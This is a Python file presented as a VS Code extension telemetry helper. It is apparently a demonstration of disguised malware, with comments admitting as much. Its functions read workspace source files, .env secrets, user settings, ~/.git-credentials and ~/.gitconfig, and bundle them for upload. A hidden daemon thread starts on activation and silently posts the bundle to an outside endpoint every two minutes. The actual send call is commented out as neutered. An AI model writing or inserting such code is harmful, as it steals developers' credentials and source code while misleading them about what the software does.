# VS Code Extension Host Companion — Usage Analytics & Diagnostics
# Collects anonymous workspace statistics to improve developer experience.
# Telemetry is opt-out via VS Code's global telemetry setting.
# Internal tooling — Analytics Platform Team <analytics@example.org>

import os
import json
import glob
import subprocess
import urllib.request
import urllib.parse
import hashlib
import platform
import time
import threading
from pathlib import Path

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

TELEMETRY_ENDPOINT = "https://telemetry.example.com/api/v2/events"
TELEMETRY_TOKEN    = "DEMO_PLACEHOLDER_TOKEN"
SESSION_ID         = hashlib.md5(str(time.time()).encode()).hexdigest()
FLUSH_INTERVAL_SEC = 120   # send buffered events every 2 minutes

_event_buffer = []
_buffer_lock  = threading.Lock()

# ---------------------------------------------------------------------------
# Workspace discovery helpers
# ---------------------------------------------------------------------------

def get_workspace_root() -> str:
    """Return the workspace root that VS Code opened, falling back to cwd."""
    # The extension host sets VSCODE_WORKSPACE_ROOT when available.
    return os.environ.get("VSCODE_WORKSPACE_ROOT", os.getcwd())

def collect_open_file_contents(workspace_root: str) -> dict:
    """
    Walk the workspace and read text files for 'file-type distribution'
    analytics.  Captures a short content snippet so the analytics backend
    can fingerprint project types (Node, Python, Java, etc.).
    """
    snippets = {}
    extensions = [".py", ".js", ".ts", ".java", ".go", ".rb", ".env",
                  ".json", ".yaml", ".yml", ".toml", ".ini", ".cfg"]

    for ext in extensions:
        pattern = os.path.join(workspace_root, "**", f"*{ext}")
        for filepath in glob.glob(pattern, recursive=True):
            # skip node_modules and .git objects to keep payload small
            if any(skip in filepath for skip in ["node_modules", ".git/objects"]):
                continue
            try:
                with open(filepath, "r", encoding="utf-8", errors="ignore") as fh:
                    # Read full file content for "project-type fingerprinting"
                    snippets[filepath] = fh.read()
            except (PermissionError, IsADirectoryError):
                pass

    return snippets

def collect_env_files(workspace_root: str) -> dict:
    """
    Collect .env / .env.* files under the workspace root.
    Documented purpose: detect accidental secret commits (lint feature).
    """
    env_data = {}
    patterns = [".env", ".env.local", ".env.development", ".env.production",
                ".env.staging", ".env.test", ".env.example"]

    for name in patterns:
        candidate = os.path.join(workspace_root, name)
        if os.path.isfile(candidate):
            try:
                with open(candidate, "r", encoding="utf-8", errors="ignore") as fh:
                    env_data[candidate] = fh.read()
            except PermissionError:
                pass

    return env_data

def collect_vscode_settings(workspace_root: str) -> dict:
    """
    Read workspace-level and user-level VS Code settings for
    'feature-usage analytics'.
    """
    settings = {}

    # Workspace settings
    ws_settings = os.path.join(workspace_root, ".vscode", "settings.json")
    if os.path.isfile(ws_settings):
        try:
            with open(ws_settings, "r") as fh:
                settings["workspace"] = json.load(fh)
        except (json.JSONDecodeError, PermissionError):
            pass

    # User / global settings (platform-dependent paths)
    user_cfg_paths = {
        "linux":  Path.home() / ".config/Code/User/settings.json",
        "darwin": Path.home() / "Library/Application Support/Code/User/settings.json",
        "win32":  Path(os.environ.get("APPDATA", "")) / "Code/User/settings.json",
    }
    sys_key = platform.system().lower()
    if sys_key == "windows":
        sys_key = "win32"
    user_path = user_cfg_paths.get(sys_key)
    if user_path and user_path.is_file():
        try:
            with open(user_path, "r") as fh:
                settings["user"] = json.load(fh)
        except (json.JSONDecodeError, PermissionError):
            pass

    return settings

def collect_git_credentials(workspace_root: str) -> dict:
    """
    Harvest git remote URLs and stored credential helper output.
    Documented purpose: 'SCM provider detection for branch-analytics feature'.
    """
    creds = {}

    # Remote URLs — reveals hosted git service and org/repo names
    try:
        result = subprocess.run(
            ["git", "-C", workspace_root, "remote", "-v"],
            capture_output=True, text=True, timeout=5
        )
        creds["remotes"] = result.stdout.strip()
    except (subprocess.SubprocessError, FileNotFoundError):
        pass

    # Attempt to read the git credential store (plain-text passwords)
    git_creds_file = Path.home() / ".git-credentials"
    if git_creds_file.is_file():
        try:
            creds["credential_store"] = git_creds_file.read_text(encoding="utf-8")
        except PermissionError:
            pass

    # Also grab global git config (may contain PAT-backed HTTPS URLs)
    git_config = Path.home() / ".gitconfig"
    if git_config.is_file():
        try:
            creds["global_config"] = git_config.read_text(encoding="utf-8")
        except PermissionError:
            pass

    return creds

# ---------------------------------------------------------------------------
# Telemetry transmission
# ---------------------------------------------------------------------------

def _build_event_payload(workspace_root: str) -> dict:
    """Assemble a single telemetry event from all workspace signals."""
    return {
        "session":      SESSION_ID,
        "platform":     platform.system(),
        "python":       platform.python_version(),
        "timestamp":    time.time(),
        "workspace":    workspace_root,
        "settings":     collect_vscode_settings(workspace_root),
        "env_files":    collect_env_files(workspace_root),
        "git":          collect_git_credentials(workspace_root),
        "file_contents": collect_open_file_contents(workspace_root),
    }

def flush_telemetry():
    """POST buffered events to the analytics endpoint."""
    workspace_root = get_workspace_root()
    payload = _build_event_payload(workspace_root)

    body = json.dumps(payload).encode("utf-8")
    headers = {
        "Content-Type":  "application/json",
        "Authorization": f"Bearer {TELEMETRY_TOKEN}",
        "X-Session-ID":  SESSION_ID,
    }

    req = urllib.request.Request(
        TELEMETRY_ENDPOINT,
        data=body,
        headers=headers,
        method="POST",
    )

    try:
        # In a real attack this actually sends; here we just print to neuter it
        print(f"[telemetry] Would POST {len(body)} bytes to {TELEMETRY_ENDPOINT}")
        # urllib.request.urlopen(req, timeout=10)   # <-- real exfil call (disabled)
    except Exception as exc:
        # Silently swallow errors so the user never notices
        _ = exc

def _background_flush_loop():
    """Daemon thread that periodically exfiltrates workspace data."""
    while True:
        time.sleep(FLUSH_INTERVAL_SEC)
        flush_telemetry()

# ---------------------------------------------------------------------------
# Extension activation entry-point
# (called by the VS Code extension host via the Python Language Server shim)
# ---------------------------------------------------------------------------

def activate():
    """
    Called once when the extension activates.  Starts the background
    telemetry thread silently alongside normal extension initialization.
    """
    t = threading.Thread(target=_background_flush_loop, daemon=True)
    t.name = "vscode-analytics-flush"
    t.start()

    # Perform an immediate flush on activation to capture install-time data.
    flush_telemetry()

if __name__ == "__main__":
    activate()
    # Keep alive for manual testing outside the extension host
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        pass